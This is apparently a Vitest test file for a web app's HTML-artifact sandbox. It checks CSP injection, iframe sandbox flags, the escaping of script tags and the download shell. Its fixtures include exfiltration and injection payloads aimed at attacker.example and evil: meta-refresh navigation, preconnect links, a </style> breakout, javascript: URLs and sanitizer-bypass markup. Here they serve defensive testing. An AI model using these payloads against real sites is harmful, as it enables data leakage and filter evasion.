// @vitest-environment jsdom
//
// Composition is pure string work, but `downloadHtmlArtifact` builds a Blob and
// drives an <a> element, so these tests need a DOM.
//
// Copyright Thales 2026
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Tests for the security-critical composition (RFC §4.7). Author script is allowed
// and must SURVIVE composition; what these tests pin is the isolation around it —
// the CSP <meta> in every composed document, `allow-scripts` without
// `allow-same-origin` on every frame, and the sandboxed shell on the two output
// paths (new tab, download) that would otherwise host the artifact as the top
// document of an origin the app shares.

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  ARTIFACT_SANDBOX,
  artifactFileName,
  artifactHasScript,
  composeHtmlDocument,
  downloadHtmlArtifact,
  sandboxedShellDocument,
  zoomIn,
  zoomOut,
  ZOOM_LEVELS,
} from "./htmlArtifactDocument";

const CSP = "Content-Security-Policy";

describe("composeHtmlDocument", () => {
  it("always injects the CSP meta — bare fragment", () => {
    const out = composeHtmlDocument("<div>hi</div>", "");
    expect(out).toContain(CSP);
    expect(out).toContain("default-src 'none'");
  });

  it("always injects the CSP meta — full document with <head>", () => {
    const out = composeHtmlDocument(
      "<!doctype html><html><head><title>t</title></head><body><p>body-text</p></body></html>",
      "",
    );
    expect(out).toContain(CSP);
    expect(out).toContain("body-text");
  });

  it("always injects the CSP meta — full document WITHOUT <head>", () => {
    const out = composeHtmlDocument("<html><body>x</body></html>", "");
    expect(out).toContain(CSP);
    expect(out.toLowerCase()).toContain("<head>");
  });

  it("wraps a bare fragment into a full document with the fragment in the body", () => {
    const out = composeHtmlDocument("<p>hello</p>", "");
    expect(out.toLowerCase()).toContain("<!doctype html>");
    expect(out).toContain("<body><p>hello</p></body>");
  });

  it("injects the author CSS as its own <style> only when present", () => {
    const withCss = composeHtmlDocument("<div>x</div>", "div { color: red; }");
    expect(withCss).toContain("<style>div { color: red; }</style>");
    // Two <style> tags: the base fit stylesheet + the author's.
    expect((withCss.match(/<style>/g) ?? []).length).toBe(2);

    const noCss = composeHtmlDocument("<div>x</div>", "");
    expect(noCss).not.toContain("color: red");
    // Only the base fit stylesheet, no author <style>.
    expect((noCss.match(/<style>/g) ?? []).length).toBe(1);
  });

  it("injects a viewport meta and a fit-to-width base stylesheet", () => {
    const out = composeHtmlDocument("<div>x</div>", "");
    expect(out).toContain('name="viewport"');
    // Media/tables are capped to the panel width so content fits the viewer.
    expect(out).toContain("max-width:100%");
  });

  it("never emits an app-URL <base> or form-action (CSP forbids both)", () => {
    const out = composeHtmlDocument("<form></form>", "");
    expect(out).toContain("base-uri 'none'");
    expect(out).toContain("form-action 'none'");
  });

  it("places the CSP before any surviving author subresource (egress ordering)", () => {
    // An author <img> reaches the body untouched; its external fetch must still be
    // governed by our CSP, so the meta must appear BEFORE it.
    const doc = '<html><img src="https://attacker.example/leak.png"><head></head><body>x</body></html>';
    const out = composeHtmlDocument(doc, "");
    const cspIdx = out.indexOf("Content-Security-Policy");
    const imgIdx = out.indexOf("attacker.example");
    expect(cspIdx).toBeGreaterThan(-1);
    expect(imgIdx).toBeGreaterThan(-1);
    expect(cspIdx).toBeLessThan(imgIdx);
  });

  it("neutralizes egress / navigation tags by policy rather than by stripping", () => {
    // Nothing is stripped any more, so an author <link>/<base> DOES reach the body.
    // What makes it inert is the CSP that precedes it: `default-src 'none'` refuses
    // the stylesheet fetch and `base-uri 'none'` refuses to retarget relative URLs.
    const doc =
      '<link rel="stylesheet" href="https://attacker.example/leak.css">' +
      '<base href="https://attacker.example/">' +
      "<p>ok</p>";
    const out = composeHtmlDocument(doc, "");
    expect(out).toContain("<p>ok</p>");
    const cspIdx = out.indexOf(CSP);
    expect(cspIdx).toBeGreaterThan(-1);
    expect(cspIdx).toBeLessThan(out.indexOf("attacker.example"));
    expect(out).toContain("default-src 'none'");
    expect(out).toContain("base-uri 'none'");
  });

  it("neutralizes a </style> breakout in the CSS", () => {
    // Author CSS that tries to escape the <style> element and inject markup.
    const out = composeHtmlDocument("<div>x</div>", '</style><meta http-equiv="refresh" content="0;url=http://evil">');
    // The attacker's `</style` is neutralized (backslash inserted) ...
    expect(out).toContain("<\\/style");
    // ... so only the legitimate closes survive (base fit style + author style =
    // 2), not a third from the injected one.
    expect((out.match(/<\/style>/gi) ?? []).length).toBe(2);
    // ... and the injected <meta> stays INSIDE the (inert) author style element,
    // before its closing tag (the LAST </style>) — never in HTML context.
    const metaIdx = out.indexOf("http-equiv");
    const authorCloseIdx = out.lastIndexOf("</style>");
    expect(metaIdx).toBeGreaterThan(-1);
    expect(metaIdx).toBeLessThan(authorCloseIdx);
  });
});

// Script is now the feature, so what must hold is that author JS SURVIVES intact
// (a sanitizer would silently break every interactive artifact) while the policy
// around it stays closed: inline script permitted, every network egress refused.
describe("composeHtmlDocument keeps author script and closes the policy", () => {
  const JS_PAYLOADS: [label: string, payload: string][] = [
    ["<script> element", "<script>document.title='built'</script>"],
    ["inline onclick", "<button onclick=\"this.textContent='ok'\">x</button>"],
    ["svg onload", '<svg onload="this.dataset.ready=1"></svg>'],
    ["module script", '<script type="module">export const a = 1;</script>'],
  ];

  it.each(JS_PAYLOADS)("passes %s through untouched", (_label, payload) => {
    const out = composeHtmlDocument(payload, "");
    expect(out).toContain(payload);
  });

  it("permits inline script while refusing every network egress", () => {
    const out = composeHtmlDocument("<script>1</script>", "");
    expect(out).toContain("script-src 'unsafe-inline'");
    // `default-src 'none'` is what still blocks fetch/XHR/WebSocket, remote
    // scripts and every other subresource, so hostile JS cannot exfiltrate.
    expect(out).toContain("default-src 'none'");
    // Pin the directive itself: a policy widened to `data:` or `*` would still
    // satisfy a "contains no URL" check on this fixed input.
    expect(out).toContain("script-src 'unsafe-inline';");
  });

  it("defuses <link> elements, the one construct that egresses despite the policy", () => {
    // `preconnect`/`dns-prefetch` perform no fetch, so no CSP directive reaches
    // them; measured egressing a hostname even from a frame that cannot run script.
    // Asserted through the PARSER: what matters is that no `link` element exists in
    // the composed document, not that some substring is absent from its text.
    const links = (author: string) =>
      new DOMParser().parseFromString(composeHtmlDocument(author, ""), "text/html").querySelectorAll("link").length;

    expect(
      links(
        '<link rel="preconnect" href="https://attacker.example"><link rel="stylesheet" href="https://a.example/x.css"><p>ok</p>',
      ),
    ).toBe(0);
    // Two measured bypasses of a delete-the-match strip, both inert now.
    // An unterminated tag: deletion needs a closing `>`, which the author withholds
    // and the composed document then supplies from its own `</body>`.
    expect(links('<p>ok</p><link rel=preconnect href="https://attacker.example" ')).toBe(0);
    // And a tag the strip would MANUFACTURE, by splicing together what surrounded
    // the text it cut out. The browser parses this author markup as no link at all.
    expect(links('<li<link>nk rel=preconnect href="https://attacker.example">')).toBe(0);

    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("<p>ok</p>");
  });

  it("defuses author <meta>, which NAVIGATES the document past every fetch directive", () => {
    // `<meta http-equiv="refresh" content="0;url=…">` is a navigation, and no CSP
    // fetch directive covers one. The export and fit-width measuring frames load
    // the composed document with no enclosing `frame-src` to catch it, so this is
    // the only thing standing between author markup and an off-origin navigation
    // carrying data in the URL. DOMPurify used to drop <meta>; it no longer runs.
    const authorMetas = (author: string) => {
      const doc = new DOMParser().parseFromString(composeHtmlDocument(author, ""), "text/html");
      // OUR injected CSP/charset/viewport metas live in <head> and must survive;
      // only what the author supplied, which lands in <body>, is defused.
      return doc.body.querySelectorAll("meta").length;
    };

    expect(authorMetas('<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=1"><p>ok</p>')).toBe(0);
    // Unterminated, the same bypass shape the <link> defusing is written against.
    expect(authorMetas('<p>ok</p><meta http-equiv=refresh content="0;url=https://attacker.example" ')).toBe(0);

    // Our own head metas are untouched — the policy still has to reach the parser.
    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("Content-Security-Policy");
    expect(composeHtmlDocument("<p>ok</p>", "")).toContain("<p>ok</p>");
  });

  it("leaves markup that merely DISPLAYS a <link> tag as text alone", () => {
    const out = composeHtmlDocument("<pre>&lt;link rel=preconnect&gt;</pre>", "");
    expect(out).toContain("&lt;link rel=preconnect&gt;");
  });

  it("keeps legitimate markup and inline <style>", () => {
    const out = composeHtmlDocument(
      '<section class="card"><h1>Title</h1><style>.card{color:red}</style></section>',
      "",
    );
    expect(out).toContain("<h1>Title</h1>");
    expect(out).toContain(".card{color:red}");
  });
});

// The sandboxed shell. Two jobs: keep the artifact off its own origin, and carry
// the `frame-src blob:` that stops it navigating itself out. Measured in Chrome 153
// (preview shape, new tab and file:// alike): without that directive an artifact
// doing `location.href="http://host/?d="+data` egresses; with it, 0 requests while
// its script still runs. The artifact must therefore be a blob: URL, not srcdoc —
// `frame-src` has nothing to match on `about:srcdoc`.
describe("sandboxedShellDocument (RFC §4.7 — the sandboxed shell)", () => {
  it("carries frame-src blob:, the only control that blocks self-navigation", () => {
    const out = sandboxedShellDocument("<h1>hi</h1>", "");
    expect(out).toContain("frame-src blob:");
    // …and hands the artifact to the child as a blob: URL, so the directive matches.
    expect(out).toContain("URL.createObjectURL");
    expect(out).toContain('id="a"');
  });

  it("contains the meta-refresh vector by policy, not by stripping it", () => {
    // This vector was in the old suite as a "must not survive composition"
    // assertion, and removing it from the suite is how the self-navigation hole
    // went unnoticed. It now reads the other way round: the meta DOES reach the
    // artifact — nothing sanitizes it — and what stops it navigating out is the
    // shell's frame-src. Deleting either half must fail a test.
    const artifact = '<meta http-equiv="refresh" content="0;url=https://attacker.example">';
    expect(composeHtmlDocument(artifact, "")).toContain("attacker.example");
    expect(sandboxedShellDocument(artifact, "")).toContain("frame-src blob:");
  });

  it("NEVER grants same-origin alongside scripts", () => {
    // The combination is what would let the content clear its own sandbox and
    // reach the app origin. This is the single most important line in the file.
    expect(ARTIFACT_SANDBOX).toBe("allow-scripts");
    const out = sandboxedShellDocument("<p>x</p>", "");
    expect(out).toContain(`sandbox="${ARTIFACT_SANDBOX}"`);
    expect(out).not.toContain("allow-same-origin");
  });

  it("blocks WebRTC, which no fetch directive covers", () => {
    expect(sandboxedShellDocument("<p>x</p>", "")).toContain("webrtc 'block'");
  });

  it("leaves the artifact no `<` at all inside the bootstrap literal", () => {
    // Two bugs, both measured in the browser, both closed by escaping every `<`:
    // the artifact's own `</script>` ended the shell's script block, and an unclosed
    // `<!--` before a `<script` flipped the tokenizer into a state where `</script>`
    // stops closing anything. Either way the bootstrap never ran and the frame
    // stayed blank — so no author `<` may survive into that literal.
    const out = sandboxedShellDocument("<script>window.x=1</script>", "");
    expect(out).toContain("\\u003c/script>");
    // Exactly one real closing tag: the bootstrap's own.
    expect((out.match(/<\/script>/g) ?? []).length).toBe(1);

    const commented = sandboxedShellDocument("<h1>a</h1><!-- <script>", "");
    expect(commented).not.toContain("<!--");
    expect(commented).toContain("\\u003c!--");
    expect((commented.match(/<\/script>/g) ?? []).length).toBe(1);
  });

  it("parses no author markup at the shell's own top level", () => {
    const out = sandboxedShellDocument("<h1>hi</h1>", "");
    // The artifact rides inside a JS string literal with every `<` escaped, so no
    // author element ever opens or closes at the shell's top level.
    expect(out).not.toContain("<h1>hi</h1>");
    expect(out).toContain("\\u003ch1>hi\\u003c/h1>");
  });

  it("passes the preview's zoom through to the artifact document", () => {
    expect(sandboxedShellDocument("<p>x</p>", "", 0.5)).toContain("zoom:0.5");
    expect(sandboxedShellDocument("<p>x</p>", "")).not.toContain("zoom:");
  });
});

// The download is the one output path with no application around it: opened by
// double-click, the file IS the top document on `file://`. It must therefore ship
// the sandboxed shell, never the bare composed artifact.
describe("downloadHtmlArtifact ships the sandboxed shell", () => {
  let saved: Blob | null;
  let clicked: boolean;

  beforeEach(() => {
    saved = null;
    clicked = false;
    vi.spyOn(URL, "createObjectURL").mockImplementation((blob: Blob | MediaSource) => {
      saved = blob as Blob;
      return "blob:stub";
    });
    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => undefined);
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {
      clicked = true;
    });
  });

  afterEach(() => vi.restoreAllMocks());

  it("saves the shell, so a double-clicked file is still frame-src protected", async () => {
    downloadHtmlArtifact("<script>window.x=1</script><h1>hi</h1>", "", "My Page");
    expect(clicked).toBe(true);
    expect(saved).not.toBeNull();
    const text = await saved!.text();
    expect(text).toContain("frame-src blob:");
    expect(text).toContain(`sandbox="${ARTIFACT_SANDBOX}"`);
    expect(text).not.toContain("allow-same-origin");
    // The artifact — script included — never parses at the file:// top level.
    expect(text).not.toContain("<h1>hi</h1>");
  });
});

describe("artifactHasScript", () => {
  it("spots a script element and an inline handler", () => {
    expect(artifactHasScript("<script>1</script>")).toBe(true);
    expect(artifactHasScript('<button onclick="f()">x</button>')).toBe(true);
  });

  it("spots a self-closing <script/>, which the parser turns into a real element", () => {
    // `<script/>` is not `<script>` followed by space or `>`, so pattern matching
    // misses it while the browser still runs it — the one case the toast is for.
    expect(artifactHasScript("<script/>window.x=1</script><p>after</p>")).toBe(true);
  });

  it("spots a `javascript:` URL, which runs on activation", () => {
    // `script-src 'unsafe-inline'` permits it, so such a page CAN execute and must
    // get the stop control and the "captured before its JavaScript runs" warning.
    expect(artifactHasScript('<a href="javascript:alert(1)">go</a>')).toBe(true);
    expect(artifactHasScript('<a href=" JavaScript:alert(1)">go</a>')).toBe(true);
    expect(artifactHasScript('<a href="https://example.com/javascript:x">go</a>')).toBe(false);
  });

  it("stays false for an artifact that merely DISPLAYS handler code as text", () => {
    // A tutorial page showing escaped markup executes nothing; warning on it would
    // make the toast noise. Only a parser can tell this from real markup.
    expect(artifactHasScript('<pre>&lt;button onclick="go()"&gt;&lt;/pre>')).toBe(false);
    expect(artifactHasScript("<pre>let online = true;</pre>")).toBe(false);
    expect(artifactHasScript("<p>Statut : online = 42</p>")).toBe(false);
  });

  it("stays false for markup with nothing to execute", () => {
    expect(artifactHasScript("<h1>hi</h1><p>text</p>")).toBe(false);
    expect(artifactHasScript('<p class="online">x</p>')).toBe(false);
  });
});

describe("composeHtmlDocument zoom", () => {
  it("injects a CSS zoom rule only when zoom !== 1", () => {
    expect(composeHtmlDocument("<div>x</div>", "", 0.5)).toContain("zoom:0.5");
    expect(composeHtmlDocument("<div>x</div>", "")).not.toContain("zoom:");
    expect(composeHtmlDocument("<div>x</div>", "", 1)).not.toContain("zoom:");
  });
});

describe("zoom stepping", () => {
  it("steps down and clamps at the smallest level", () => {
    expect(zoomOut(1)).toBe(0.9);
    expect(zoomOut(ZOOM_LEVELS[0])).toBe(ZOOM_LEVELS[0]);
  });

  it("steps up and clamps at the largest level", () => {
    expect(zoomIn(1)).toBe(1.1);
    expect(zoomIn(ZOOM_LEVELS[ZOOM_LEVELS.length - 1])).toBe(ZOOM_LEVELS[ZOOM_LEVELS.length - 1]);
  });
});

describe("artifactFileName", () => {
  it("slugifies the title and always ends in .html", () => {
    expect(artifactFileName("My Landing Page!")).toBe("my-landing-page.html");
  });

  it("falls back to a default for an empty/blank title", () => {
    expect(artifactFileName("   ")).toBe("artifact.html");
    expect(artifactFileName("")).toBe("artifact.html");
  });

  it("uses the given extension (e.g. png) when provided", () => {
    expect(artifactFileName("My Landing Page!", "png")).toBe("my-landing-page.png");
    expect(artifactFileName("", "png")).toBe("artifact.png");
  });
});
